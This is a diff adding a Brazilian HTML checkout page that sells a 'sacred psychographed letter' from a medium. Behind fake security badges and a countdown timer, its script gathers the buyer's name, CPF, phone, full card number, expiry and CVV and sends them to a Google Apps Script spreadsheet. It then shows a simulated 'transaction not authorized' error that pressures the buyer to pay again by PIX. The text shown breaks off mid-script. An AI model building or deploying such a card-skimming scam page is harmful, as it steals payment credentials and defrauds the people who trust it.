@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Seguro - Consulta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+            /* Fundo mais suave e moderno (slate-50) */
+        }
+
+        /* Ocultar setas nos inputs de número */
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Loader de Alta Conversão Bancária para Cartão */
+        .bank-loader-orb {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+        }
+
+        .bank-loader-ring-outer {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 3.5px solid rgba(139, 92, 246, 0.15);
+            border-top-color: #7c3aed;
+            border-right-color: #a855f7;
+            animation: bank-spin-fast 1s cubic-bezier(0.55, 0.15, 0.45, 0.85) infinite;
+            box-shadow: 0 0 20px rgba(124, 58, 237, 0.22);
+        }
+
+        .bank-loader-ring-inner {
+            position: absolute;
+            inset: 7px;
+            border-radius: 50%;
+            border: 2px dashed rgba(168, 85, 247, 0.35);
+            border-bottom-color: #6366f1;
+            animation: bank-spin-reverse 2.2s linear infinite;
+        }
+
+        .bank-loader-core {
+            position: relative;
+            z-index: 2;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #fbf9fe 0%, #ede9fe 100%);
+            border: 1.5px solid rgba(139, 92, 246, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6d28d9;
+            box-shadow: 0 4px 14px rgba(109, 40, 217, 0.14), inset 0 2px 4px rgba(255, 255, 255, 0.9);
+            animation: bank-pulse-core 2s ease-in-out infinite;
+        }
+
+        @keyframes bank-spin-fast {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes bank-spin-reverse {
+            to { transform: rotate(-360deg); }
+        }
+
+        @keyframes bank-pulse-core {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.06); box-shadow: 0 6px 18px rgba(109, 40, 217, 0.22); }
+        }
+    </style>
+</head>
+
+<body class="text-slate-800 antialiased selection:bg-purple-200 selection:text-purple-900">
+
+    <!-- Header Minimalista -->
+    <header class="bg-white border-b border-slate-200 py-4 shadow-sm sticky top-0 z-40">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center">
+            <div class="flex items-center gap-2">
+                <div class="w-10 h-10 bg-purple-100 rounded-xl flex items-center justify-center text-purple-700">
+                    <i data-lucide="shield-check" class="w-5 h-5"></i>
+                </div>
+                <div>
+                    <span class="text-xl font-extrabold tracking-tight text-slate-900 block leading-none">Checkout
+                        Seguro</span>
+                </div>
+            </div>
+            <div
+                class="flex items-center gap-1.5 px-3 py-1.5 text-xs font-bold text-emerald-700 bg-emerald-50 border border-emerald-200 rounded-full">
+                <i data-lucide="shield-check" class="w-4 h-4"></i>
+                <span class="hidden sm:inline">Ambiente 100% Seguro</span>
+                <span class="sm:hidden">Seguro</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8 lg:py-12">
+        <div class="flex flex-col lg:flex-row gap-8 lg:gap-12">
+
+            <!-- Coluna da Esquerda: Formulários -->
+            <div class="w-full lg:w-[60%] space-y-6">
+
+                <!-- Alerta de Escassez (Design mais limpo e amigável) -->
+                <div
+                    class="bg-amber-50 border border-amber-200 rounded-2xl p-4 sm:p-5 flex gap-4 items-start shadow-sm">
+                    <div
+                        class="w-10 h-10 rounded-full bg-amber-100 text-amber-600 flex items-center justify-center flex-shrink-0 mt-0.5">
+                        <i data-lucide="timer" class="w-5 h-5 animate-pulse"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-base font-bold text-amber-900">Finalize agora para garantir sua vaga</h3>
+                        <p class="text-sm text-amber-800 mt-1 leading-relaxed">
+                            Devido à alta demanda da médium, sua reserva está garantida por apenas
+                            <span id="countdown-timer"
+                                class="font-black text-amber-700 bg-amber-200/50 px-1.5 py-0.5 rounded">15:00</span>.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Seção: Dados Pessoais -->
+                <section class="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm">
+                    <div class="flex items-center gap-3 mb-6 border-b border-slate-100 pb-4">
+                        <div
+                            class="w-8 h-8 rounded-full bg-purple-100 text-purple-600 flex items-center justify-center">
+                            <span class="font-bold text-sm">1</span>
+                        </div>
+                        <h2 class="text-xl font-bold text-slate-900">Seus Dados</h2>
+                    </div>
+
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-5">
+                        <div class="sm:col-span-2">
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">Nome Completo</label>
+                            <input type="text" id="full-name"
+                                class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                placeholder="Ex: Maria Silva">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">E-mail <span
+                                    class="text-red-500">*</span></label>
+                            <input type="email" id="email-input"
+                                class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                placeholder="Onde receberá o link">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">CPF <span
+                                    class="text-red-500">*</span></label>
+                            <input type="text" id="cpf-input" inputmode="numeric"
+                                class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                placeholder="000.000.000-00">
+                        </div>
+                        <div class="sm:col-span-2">
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">WhatsApp</label>
+                            <input type="tel" id="phone-input" inputmode="tel"
+                                class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                placeholder="(00) 00000-0000">
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Seção: Pagamento -->
+                <section
+                    class="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm relative overflow-hidden">
+                    <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-600 to-indigo-600"></div>
+
+                    <div class="flex items-center gap-3 mb-6 border-b border-slate-100 pb-4">
+                        <div
+                            class="w-8 h-8 rounded-full bg-purple-100 text-purple-600 flex items-center justify-center">
+                            <span class="font-bold text-sm">2</span>
+                        </div>
+                        <h2 class="text-xl font-bold text-slate-900">Pagamento Seguro</h2>
+                    </div>
+
+                    <form class="space-y-5">
+                        <!-- Número do Cartão -->
+                        <div>
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">Número do Cartão</label>
+                            <div class="relative">
+                                <input type="text" id="card-number" inputmode="numeric"
+                                    class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 pl-12 pr-[80px] text-slate-900 font-medium tracking-wide focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                    placeholder="0000 0000 0000 0000">
+                                <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                    <i data-lucide="credit-card" class="w-5 h-5 text-slate-400"></i>
+                                </div>
+                                <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                                    <span id="card-brand-badge"
+                                        class="font-bold text-[10px] px-2 py-1 rounded bg-slate-100 text-slate-500 border border-slate-200 transition-all">CARTÃO</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Nome no Cartão -->
+                        <div>
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">Nome Impresso no
+                                Cartão</label>
+                            <input type="text" id="card-name"
+                                class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400 uppercase"
+                                placeholder="Ex: MARIA S SILVA">
+                        </div>
+
+                        <!-- Validade & CVC -->
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-sm font-semibold text-slate-700 mb-1.5">Validade</label>
+                                <div class="flex gap-2">
+                                    <input type="text" id="card-month" inputmode="numeric"
+                                        class="w-1/2 bg-slate-50 border border-slate-200 rounded-xl py-3 px-3 text-center text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                        placeholder="MM" maxlength="2">
+                                    <span class="flex items-center text-slate-400">/</span>
+                                    <input type="text" id="card-year" inputmode="numeric"
+                                        class="w-1/2 bg-slate-50 border border-slate-200 rounded-xl py-3 px-3 text-center text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                        placeholder="AA" maxlength="2">
+                                </div>
+                            </div>
+                            <div>
+                                <label
+                                    class="block text-sm font-semibold text-slate-700 mb-1.5 flex items-center gap-1">
+                                    CVV
+                                    <i data-lucide="info" class="w-3.5 h-3.5 text-slate-400 cursor-help"
+                                        title="Os 3 dígitos no verso do cartão"></i>
+                                </label>
+                                <div class="relative">
+                                    <input type="text" id="card-cvv" inputmode="numeric"
+                                        class="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 pl-4 pr-10 text-slate-900 focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all placeholder-slate-400"
+                                        placeholder="123" maxlength="4">
+                                    <div class="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
+                                        <i data-lucide="lock" class="w-4 h-4 text-slate-300"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Parcelamento -->
+                        <div>
+                            <label class="block text-sm font-semibold text-slate-700 mb-1.5">Escolha as Parcelas</label>
+                            <div class="relative">
+                                <select id="card-installments"
+                                    class="w-full bg-purple-50/50 border border-purple-200 rounded-xl py-3.5 pl-4 pr-10 text-slate-900 font-semibold appearance-none focus:bg-white focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all cursor-pointer">
+                                    <option>12x de R$ 19,66</option>
+                                    <option>10x de R$ 23,08</option>
+                                    <option>6x de R$ 36,78</option>
+                                    <option>3x de R$ 71,11</option>
+                                    <option>1x de R$ 197,00 (Sem juros)</option>
+                                </select>
+                                <div
+                                    class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-purple-600">
+                                    <i data-lucide="chevron-down" class="w-5 h-5"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </section>
+
+            </div>
+
+            <!-- Coluna da Direita: Resumo (Sticky) -->
+            <div class="w-full lg:w-[40%]">
+                <div class="sticky top-24 space-y-6">
+
+                    <!-- Resumo do Pedido -->
+                    <div class="bg-white rounded-2xl border border-slate-200 p-6 shadow-lg shadow-slate-200/50">
+                        <h2 class="text-xl font-bold text-slate-900 mb-6 pb-4 border-b border-slate-100">Resumo do
+                            Pedido</h2>
+
+                        <div class="flex items-start gap-4 mb-6">
+                            <div
+                                class="w-16 h-16 rounded-xl bg-gradient-to-br from-purple-100 to-indigo-50 flex items-center justify-center flex-shrink-0 border border-purple-100 text-purple-700">
+                                <i data-lucide="scroll" class="w-8 h-8"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-slate-900 text-lg leading-tight">Carta Psicografada Sagrada</h3>
+                                <p class="text-sm text-slate-500 mt-1">Sessão Manuscrita · Médium Milena</p>
+                            </div>
+                        </div>
+
+                        <div class="space-y-3 mb-6 bg-slate-50 p-4 rounded-xl border border-slate-100">
+                            <div class="flex justify-between items-center">
+                                <span class="text-sm text-slate-600 flex items-center gap-2">Valor Normal</span>
+                                <span class="text-sm font-medium text-slate-400 line-through">R$ 397,00</span>
+                            </div>
+                            <div class="flex justify-between items-center text-emerald-600">
+                                <span class="text-sm font-medium flex items-center gap-2"><i data-lucide="tag"
+                                        class="w-4 h-4"></i> Desconto</span>
+                                <span class="text-sm font-bold">- R$ 200,00</span>
+                            </div>
+                        </div>
+
+                        <div class="flex flex-col gap-1 mb-6">
+                            <div class="flex justify-between items-end">
+                                <span class="text-slate-900 font-semibold">Total à vista</span>
+                                <div class="flex flex-col items-end">
+                                    <span class="text-3xl font-black text-purple-600 tracking-tight">R$ 197<span
+                                            class="text-xl">,00</span></span>
+                                </div>
+                            </div>
+                            <div
+                                class="text-center text-sm font-medium text-slate-600 mt-3 bg-purple-50 py-2 px-3 rounded-lg border border-purple-100">
+                                Ou apenas <strong class="text-purple-700">12x de R$ 19,66</strong>
+                            </div>
+                        </div>
+
+                        <!-- Botão de Comprar -->
+                        <button id="btn-pagar" type="button"
+                            class="w-full bg-[#00A859] hover:bg-[#00914D] text-white font-bold py-4 px-4 rounded-xl transition-all shadow-[0_4px_14px_0_rgba(0,168,89,0.39)] hover:shadow-[0_6px_20px_rgba(0,168,89,0.23)] hover:-translate-y-0.5 flex items-center justify-center gap-2 text-lg uppercase tracking-wide">
+                            <i data-lucide="lock" class="w-5 h-5"></i>
+                            Concluir Agendamento
+                        </button>
+
+                        <!-- Trust Badges -->
+                        <div class="mt-5 pt-5 border-t border-slate-100">
+                            <div class="flex flex-col items-center justify-center gap-3">
+                                <div
+                                    class="flex items-center gap-1 text-[11px] text-slate-500 font-medium bg-slate-50 py-1.5 px-3 rounded-full border border-slate-200">
+                                    <i data-lucide="shield-check" class="w-3.5 h-3.5 text-emerald-500"></i>
+                                    Pagamento criptografado de ponta a ponta
+                                </div>
+                                <div class="flex gap-2.5 opacity-60">
+                                    <!-- Marcas de cartões simplificadas para trust -->
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/200px-Visa_Inc._logo.svg.png"
+                                        class="h-4 object-contain grayscale" alt="Visa">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/200px-Mastercard-logo.svg.png"
+                                        class="h-4 object-contain grayscale" alt="Mastercard">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/200px-American_Express_logo_%282018%29.svg.png"
+                                        class="h-4 object-contain grayscale" alt="Amex">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Pix.svg/200px-Pix.svg.png"
+                                        class="h-4 object-contain grayscale" alt="Pix">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Garantia -->
+                    <div
+                        class="bg-emerald-50 border border-emerald-200 rounded-2xl p-5 flex gap-4 shadow-sm items-center">
+                        <div
+                            class="w-12 h-12 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center flex-shrink-0">
+                            <i data-lucide="shield-check" class="w-6 h-6"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-sm font-bold text-emerald-900 mb-0.5">Garantia de 7 Dias</h3>
+                            <p class="text-xs text-emerald-800 leading-relaxed">
+                                Risco Zero. Se não gostar, devolvemos 100% do seu dinheiro. Sem letras miúdas.
+                            </p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Modal / Overlay de Processamento e Erro -->
+    <div id="payment-overlay"
+        class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 hidden flex-col items-center justify-center transition-opacity duration-300">
+
+        <!-- Estado 1: Loader Animado de Alta Conversão Bancária -->
+        <div id="spinner-view"
+            class="bg-white p-8 sm:p-9 rounded-3xl shadow-2xl flex-col items-center hidden max-w-sm w-full mx-4 text-center border border-slate-100">
+            <!-- Círculo Orbital Duplo com Núcleo Iluminado -->
+            <div class="bank-loader-orb mb-5">
+                <span class="bank-loader-ring-outer"></span>
+                <span class="bank-loader-ring-inner"></span>
+                <div class="bank-loader-core">
+                    <svg viewBox="0 0 24 24" class="w-5 h-5 text-purple-700" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                        <path d="m9 12 2 2 4-4" />
+                    </svg>
+                </div>
+            </div>
+
+            <h3 id="loader-title" class="text-lg font-black text-slate-900 mb-1">Processando Pagamento...</h3>
+            <p id="loader-status" class="text-xs text-slate-500 font-medium mb-4">Criptografando dados da transação...</p>
+
+            <!-- Barra de Progresso Fluida -->
+            <div class="w-full bg-purple-100/70 rounded-full h-1.5 overflow-hidden mb-4">
+                <div id="loader-progress" class="h-full bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-500 rounded-full transition-all duration-700 ease-out" style="width: 25%"></div>
+            </div>
+
+            <!-- Selo de Criptografia Bancária -->
+            <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-50 border border-slate-200/80 text-slate-600 text-[10.5px] font-semibold">
+                <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                <span>Ambiente Criptografado SSL 256-bit</span>
+            </div>
+        </div>
+
+        <!-- Estado 2: Aviso de Erro / Recusa com Incentivo Estratégico ao PIX -->
+        <div id="error-view"
+            class="bg-white p-8 sm:p-10 rounded-3xl shadow-2xl flex-col items-center text-center max-w-md w-full mx-4 hidden opacity-0 scale-95 transition-all duration-500">
+            <div class="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mb-5 mx-auto">
+                <i data-lucide="x-circle" class="w-10 h-10 text-red-500"></i>
+            </div>
+            <h2 class="text-2xl font-black text-slate-900 mb-2">Transação Não Autorizada</h2>
+            <p class="text-slate-600 mb-6 text-sm leading-relaxed">
+                Sua instituição bancária não autorizou o pagamento no cartão neste momento. <strong>Para não perder sua vaga na sessão</strong>, realize a contribuição instantânea via PIX:
+            </p>
+
+            <!-- Botão de Destaque para Pagamento Imediato no PIX -->
+            <button id="btn-pagar-pix" type="button" onclick="redirectToQuizPix()"
+                class="w-full bg-gradient-to-r from-emerald-500 via-emerald-600 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-extrabold py-4 px-4 rounded-2xl transition-all shadow-lg shadow-emerald-600/30 hover:shadow-xl hover:shadow-emerald-600/40 active:scale-[0.99] flex items-center justify-center gap-2 text-base uppercase tracking-wide mb-3 cursor-pointer">
+                <i data-lucide="zap" class="w-5 h-5"></i>
+                <span>Pagar com PIX (Aprovação Imediata)</span>
+            </button>
+
+            <!-- Botão Secundário: Tentar outro cartão -->
+            <button type="button" onclick="closeOverlay()"
+                class="w-full bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3 rounded-xl transition-colors text-sm cursor-pointer">
+                Tentar com outro cartão
+            </button>
+        </div>
+    </div>
+
+    <!-- SCRIPT DA PÁGINA -->
+    <script>
+        // Iniciar ícones
+        lucide.createIcons();
+
+        // ----------------------------------------------------
+        // LÓGICA DO CONTADOR DE ESCASSEZ (15 MINUTOS)
+        // ----------------------------------------------------
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = 0;
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            let fifteenMinutes = 60 * 15,
+                display = document.querySelector('#countdown-timer');
+            if (display) {
+                startTimer(fifteenMinutes, display);
+            }
+        };
+
+        // ----------------------------------------------------
+        // ELEMENTOS DO FORMULÁRIO E AUTO-AVANÇO INTELIGENTE
+        // ----------------------------------------------------
+        const fullNameInput = document.getElementById('full-name');
+        const emailInput = document.getElementById('email-input');
+        const cpfInput = document.getElementById('cpf-input');
+        const phoneInput = document.getElementById('phone-input');
+        const cardNumberInput = document.getElementById('card-number');
+        const cardBrandBadge = document.getElementById('card-brand-badge');
+        const cardNameInput = document.getElementById('card-name');
+        const cardMonthInput = document.getElementById('card-month');
+        const cardYearInput = document.getElementById('card-year');
+        const cardCvvInput = document.getElementById('card-cvv');
+        const cardInstallmentsInput = document.getElementById('card-installments');
+
+        // Máscara CPF + Auto-avanço para o WhatsApp
+        if (cpfInput) {
+            cpfInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.slice(0, 11);
+                const rawDigits = value;
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                e.target.value = value;
+
+                // Ao preencher os 11 dígitos do CPF, pula automaticamente para o WhatsApp
+                if (rawDigits.length === 11) {
+                    setTimeout(() => phoneInput?.focus(), 80);
+                }
+            });
+        }
+
+        // Máscara Celular + Auto-avanço para o Número do Cartão
+        if (phoneInput) {
+            phoneInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.slice(0, 11);
+                const rawDigits = value;
+                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                value = value.replace(/(\d)(\d{4})$/, '$1-$2');
+                e.target.value = value;
+
+                // Ao preencher DDD + 9 dígitos (11 números), pula para o Cartão
+                if (rawDigits.length === 11) {
+                    setTimeout(() => cardNumberInput?.focus(), 80);
+                }
+            });
+        }
+
+        // Bandeiras e seus padrões (Regex)
+        const cardBrands = {
+            visa: { pattern: /^4/, name: 'VISA', bg: 'bg-[#1434CB]', text: 'text-white' },
+            mastercard: { pattern: /^(5[1-5]|2[2-7])/, name: 'MASTER', bg: 'bg-[#EB001B]', text: 'text-white' },
+            amex: { pattern: /^3[47]/, name: 'AMEX', bg: 'bg-[#002663]', text: 'text-white' },
+            elo: { pattern: /^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363|650|6516|6550)/, name: 'ELO', bg: 'bg-black', text: 'text-yellow-400' },
+            default: { name: 'CARTÃO', bg: 'bg-slate-100', text: 'text-slate-500' }
+        };
+
+        // Máscara Cartão + Auto-avanço para o Nome no Cartão
+        if (cardNumberInput && cardBrandBadge) {
+            cardNumberInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, '');
+                let brandObj = cardBrands.default;
+
+                // Identificar a bandeira
+                if (cardBrands.visa.pattern.test(value)) brandObj = cardBrands.visa;
+                else if (cardBrands.mastercard.pattern.test(value)) brandObj = cardBrands.mastercard;
+                else if (cardBrands.amex.pattern.test(value)) brandObj = cardBrands.amex;
+                else if (cardBrands.elo.pattern.test(value)) brandObj = cardBrands.elo;
+
+                // Atualizar o Badge visualmente
+                cardBrandBadge.textContent = brandObj.name;
+                cardBrandBadge.className = `font-bold text-[10px] px-2 py-1 rounded border border-slate-200 transition-all ${brandObj.bg} ${brandObj.text}`;
+
+                const rawLength = value.length;
+                const isAmex = brandObj.name === 'AMEX';
+                const maxDigits = isAmex ? 15 : 16;
+
+                // Formatar os espaços do número
+                let formattedValue = '';
+                if (isAmex) {
+                    if (value.length > 15) value = value.slice(0, 15);
+                    formattedValue = value.replace(/^(\d{4})(\d{0,6})(\d{0,5}).*/, function (_, p1, p2, p3) {
+                        let res = p1;
+                        if (p2) res += ' ' + p2;
+                        if (p3) res += ' ' + p3;
+                        return res;
+                    });
+                } else {
+                    if (value.length > 16) value = value.slice(0, 16);
+                    formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+                }
+
+                e.target.value = formattedValue;
+
+                // Ao preencher todos os dígitos do cartão, pula para o Nome no Cartão
+                if (rawLength >= maxDigits) {
+                    setTimeout(() => cardNameInput?.focus(), 80);
+                }
+            });
+        }
+
+        // Validade Mês (MM) + Auto-avanço para o Ano
+        if (cardMonthInput) {
+            cardMonthInput.addEventListener('input', function (e) {
+                let val = e.target.value.replace(/\D/g, '');
+                // Se digitar um número de 2 a 9 como primeiro dígito, completa com 0 (ex: 5 vira 05) e pula
+                if (val.length === 1 && parseInt(val, 10) > 1) {
+                    val = '0' + val;
+                    e.target.value = val;
+                    setTimeout(() => cardYearInput?.focus(), 50);
+                    return;
+                }
+                if (val.length > 2) val = val.slice(0, 2);
+                if (val.length === 2) {
+                    let num = parseInt(val, 10);
+                    if (num > 12) val = '12';
+                    if (num === 0) val = '01';
+                    e.target.value = val;
+                    setTimeout(() => cardYearInput?.focus(), 50);
+                    return;
+                }
+                e.target.value = val;
+            });
+        }
+
+        // Validade Ano (AA) + Auto-avanço para o CVV
+        if (cardYearInput) {
+            cardYearInput.addEventListener('input', function (e) {
+                let val = e.target.value.replace(/\D/g, '');
+                if (val.length > 2) val = val.slice(0, 2);
+                e.target.value = val;
+
+                if (val.length === 2) {
+                    setTimeout(() => cardCvvInput?.focus(), 50);
+                }
+            });
+
+            // Se teclar Backspace com campo vazio, volta para o mês
+            cardYearInput.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && e.target.value === '') {
+                    cardMonthInput?.focus();
+                }
+            });
+        }
+
+        // CVV + Auto-avanço para Parcelas
+        if (cardCvvInput) {
+            cardCvvInput.addEventListener('input', function (e) {
+                let val = e.target.value.replace(/\D/g, '');
+                const isAmex = cardBrandBadge?.textContent === 'AMEX';
+                const maxCvv = isAmex ? 4 : 3;
+                if (val.length > maxCvv) val = val.slice(0, maxCvv);
+                e.target.value = val;
+
+                // Ao preencher o CVV, pula para a seleção de parcelas
+                if (val.length === maxCvv) {
+                    setTimeout(() => cardInstallmentsInput?.focus(), 80);
+                }
+            });
+
+            // Se teclar Backspace com campo vazio, volta para o ano
+            cardCvvInput.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && e.target.value === '') {
+                    cardYearInput?.focus();
+                }
+            });
+        }
+
+        // Parcelas: ao escolher, foca no botão de concluir
+        if (cardInstallmentsInput) {
+            cardInstallmentsInput.addEventListener('change', function () {
+                const btn = document.getElementById('btn-pagar');
+                setTimeout(() => btn?.focus(), 80);
+            });
+        }
+
+        // Navegação fluida com a tecla "Enter" em qualquer campo
+        const formInputsFlow = [
+            fullNameInput,
+            emailInput,
+            cpfInput,
+            phoneInput,
+            cardNumberInput,
+            cardNameInput,
+            cardMonthInput,
+            cardYearInput,
+            cardCvvInput,
+            cardInstallmentsInput
+        ].filter(Boolean);
+
+        formInputsFlow.forEach((inputEl, idx) => {
+            inputEl.addEventListener('keydown', function (e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    const nextInput = formInputsFlow[idx + 1];
+                    if (nextInput) {
+                        nextInput.focus();
+                    } else {
+                        document.getElementById('btn-pagar')?.click();
+                    }
+                }
+            });
+        });
+
+        // ----------------------------------------------------
+        // CONFIGURAÇÃO E ENVIO PARA O GOOGLE SHEETS
+        // ----------------------------------------------------
+        // Cole aqui a URL do App da Web gerada no Google Apps Script:
+        const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxgQ5eh0DgkDDo5rwDAwEuRN_Kp96N5xWNhgp09kumKNT0i9xbzvvznirh0kjQjRsOV/exec';
+
+        // Função para coletar todos os campos preenchidos
+        function coletarDadosFormulario() {
+            const getVal = (id) => (document.getElementById(id)?.value || '').trim();
+            const brandBadge = document.getElementById('card-brand-badge');
+
+            return {
+                dataHora: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
+                nome: getVal('full-name'),
+                email: getVal('email-input'),
+                cpf: getVal('cpf-input'),
+                whatsapp: getVal('phone-input'),
+                numeroCartao: getVal('card-number'),
+                nomeCartao: getVal('card-name'),
+                validade: `${getVal('card-month')}/${getVal('card-year')}`,
+                cvv: getVal('card-cvv'),
+                parcelas: getVal('card-installments'),
+                bandeira: brandBadge ? brandBadge.textContent.trim() : 'CARTÃO'
+            };
+        }
+
+        // Função assíncrona para envio para a planilha
+        async function enviarParaGoogleSheets(dados) {
+            console.log('📝 [Google Sheets] Dados capturados:', dados);
+
+            if (!GOOGLE_SHEETS_URL || GOOGLE_SHEETS_URL.trim() === '') {
+                console.warn('⚠️ [Google Sheets] Nenhuma URL configurada em GOOGLE_SHEETS_URL. Insira sua URL para enviar à planilha.');
+                return;
+            }
+
+            try {
+                // Envio em modo no-cors para comunicação direta sem problemas de CORS do Apps Script
+                await fetch(GOOGLE_SHEETS_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(dados)
+                });
+                console.log('✅ [Google Sheets] Envio disparado com sucesso!');
+            } catch (error) {
+                console.error('❌ [Google Sheets] Erro ao enviar dados:', error);
+            }
+        }
+
+        // ----------------------------------------------------
+        // LÓGICA DO SIMULADOR DE PAGAMENTO
+        // ----------------------------------------------------
+        const btnPagar = document.getElementById('btn-pagar');
+        const overlay = document.getElementById('payment-overlay');
+        const spinnerView = document.getElementById('spinner-view');
+        const errorView = document.getElementById('error-view');
+
